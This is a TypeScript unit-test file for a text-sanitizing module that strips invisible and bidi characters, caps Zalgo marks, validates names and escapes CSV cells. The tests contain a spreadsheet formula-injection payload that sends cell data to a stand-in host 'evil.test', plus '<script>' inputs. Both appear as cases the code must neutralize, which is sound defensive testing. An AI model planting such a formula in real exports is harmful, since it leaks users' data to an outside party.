import { describe, expect, it } from "vitest";

import {
  escapeCsvCell,
  graphemeLength,
  isValidBusinessName,
  isValidPersonName,
  sanitizeName,
  sanitizeText,
  truncateGraphemes,
} from "./text-safety";

/**
 * Every invisible character in these tests is built from its code point rather
 * than pasted as a literal. Pasted, they are indistinguishable from nothing at
 * all in a diff — which is exactly the property that makes them an attack.
 */
const cp = (...points: number[]) => String.fromCodePoint(...points);

const ZWSP = cp(0x200b); // ZERO WIDTH SPACE
const RLO = cp(0x202e); // RIGHT-TO-LEFT OVERRIDE
const NBSP = cp(0x00a0); // NO-BREAK SPACE
const LINE_SEP = cp(0x2028); // LINE SEPARATOR
const NUL = cp(0x0000);
const BELL = cp(0x0007);

const countMarks = (s: string) => [...s].filter((c) => /\p{M}/u.test(c)).length;

describe("sanitizeText", () => {
  it("trims and collapses whitespace", () => {
    expect(sanitizeText("  Aarav   Sharma  ")).toBe("Aarav Sharma");
  });

  it("strips zero-width characters used to fake distinct duplicates", () => {
    // Renders identically to "AaravSharma" but is a different string, so it
    // would slip past every uniqueness check untreated.
    const sneaky = `Aarav${ZWSP}Sharma`;
    expect(sneaky).not.toBe("AaravSharma");
    expect(sanitizeText(sneaky)).toBe("AaravSharma");
  });

  it("collapses a run of zero-width spaces without leaving a visible gap", () => {
    expect(sanitizeText(`A${ZWSP}${ZWSP}${ZWSP}B`)).toBe("AB");
  });

  it("strips the bidi override that would reverse displayed text", () => {
    expect(sanitizeText(`Aarav${RLO}Sharma`)).toBe("AaravSharma");
  });

  it("strips control characters", () => {
    expect(sanitizeText(`Aarav${NUL}${BELL}Sharma`)).toBe("AaravSharma");
  });

  it("converts non-breaking and exotic spaces to plain spaces", () => {
    expect(sanitizeText(`Aarav${NBSP}Sharma`)).toBe("Aarav Sharma");
    expect(sanitizeText(`Aarav${LINE_SEP}Sharma`)).toBe("Aarav Sharma");
  });

  it("normalizes decomposed forms to NFC so comparisons match", () => {
    const decomposed = `Jos${cp(0x0065, 0x0301)}`; // e + combining acute
    const composed = `Jos${cp(0x00e9)}`; // precomposed é
    expect(decomposed).not.toBe(composed);
    expect(sanitizeText(decomposed)).toBe(composed);
  });

  it("preserves Kannada text unchanged", () => {
    const kannada = "ಆರವ್ ಶರ್ಮಾ";
    expect(sanitizeText(kannada)).toBe(kannada);
  });
});

describe("sanitizeName", () => {
  it("caps combining marks so Zalgo text can't overflow a table row", () => {
    // Six combining marks stacked on one base character.
    const zalgo = `A${cp(0x0301, 0x0302, 0x0303, 0x0304, 0x0305, 0x0306)}B`;
    expect(countMarks(zalgo)).toBe(6);

    const cleaned = sanitizeName(zalgo);
    // NFC composes A + U+0301 into a single precomposed Á, leaving five loose
    // marks — of which the limiter keeps two.
    expect(countMarks(cleaned)).toBe(2);
    // The real characters either side survive.
    expect(cleaned.startsWith(cp(0x00c1))).toBe(true);
    expect(cleaned.endsWith("B")).toBe(true);
  });

  it("leaves legitimate Kannada vowel signs intact", () => {
    const kannada = "ಶರ್ಮಾ";
    expect(sanitizeName(kannada)).toBe(kannada);
  });

  it("leaves a normal accented Latin name intact", () => {
    expect(sanitizeName("José")).toBe("José");
  });
});

describe("graphemeLength", () => {
  it("counts an emoji ZWJ sequence as one grapheme", () => {
    // Many UTF-16 code units, but one thing a human sees — which is why a
    // `.length` cap is the wrong tool.
    const family = cp(0x1f468, 0x200d, 0x1f469, 0x200d, 0x1f466);
    expect(family.length).toBeGreaterThan(1);
    expect(graphemeLength(family)).toBe(1);
  });

  it("counts plain ASCII normally", () => {
    expect(graphemeLength("Aarav")).toBe(5);
  });

  it("counts Kannada well below its code-unit length", () => {
    // Segmenter splits Indic conjuncts at the virama, so this is 2 clusters
    // rather than 1 — the point is only that it tracks perceived characters
    // far more closely than `.length` (4) does.
    const shri = "ಶ್ರೀ";
    expect(graphemeLength(shri)).toBe(2);
    expect(graphemeLength(shri)).toBeLessThan(shri.length);
  });
});

describe("truncateGraphemes", () => {
  it("leaves short values alone", () => {
    expect(truncateGraphemes("Aarav", 60)).toBe("Aarav");
  });

  it("truncates without splitting a grapheme in half", () => {
    const family = cp(0x1f468, 0x200d, 0x1f469, 0x200d, 0x1f466);
    const out = truncateGraphemes(family.repeat(3), 2);
    expect(graphemeLength(out)).toBe(2);
  });
});

describe("isValidPersonName", () => {
  it.each([
    "Aarav Sharma",
    "ಆರವ್ ಶರ್ಮಾ",
    "D'Souza",
    "Rama-Krishna",
    "M. S. Prasad",
    "Siddalinga Prasad",
  ])("accepts %s", (name) => {
    expect(isValidPersonName(name)).toBe(true);
  });

  it.each([
    ["digits", "Aarav123"],
    ["angle brackets", "Aarav<script>"],
    ["at sign", "aarav@example.com"],
    ["empty", ""],
  ])("rejects %s", (_label, name) => {
    expect(isValidPersonName(name)).toBe(false);
  });
});

describe("isValidBusinessName", () => {
  it("accepts digits and ampersands that real studio names use", () => {
    expect(isValidBusinessName("Studio 7")).toBe(true);
    expect(isValidBusinessName("A & B Photo")).toBe(true);
    expect(isValidBusinessName("Aarav Photo / Video")).toBe(true);
  });

  it("still rejects angle brackets", () => {
    expect(isValidBusinessName("Studio <script>")).toBe(false);
  });
});

describe("escapeCsvCell", () => {
  it.each(["=", "+", "-", "@"])(
    "prefixes a cell starting with %s so Excel treats it as text",
    (char) => {
      expect(escapeCsvCell(`${char}HYPERLINK("x")`)).toBe(
        `'${char}HYPERLINK("x")`,
      );
    },
  );

  it("neutralizes the exfiltration payload that motivated this", () => {
    const attack = '=HYPERLINK("http://evil.test?"&A1,"Click")';
    expect(escapeCsvCell(attack).startsWith("'")).toBe(true);
  });

  it("leaves ordinary values untouched", () => {
    expect(escapeCsvCell("Aarav Sharma")).toBe("Aarav Sharma");
    expect(escapeCsvCell("9845011234")).toBe("9845011234");
    expect(escapeCsvCell("")).toBe("");
  });

  it("does not touch a hyphen that appears later in the value", () => {
    expect(escapeCsvCell("Rama-Krishna")).toBe("Rama-Krishna");
  });
});
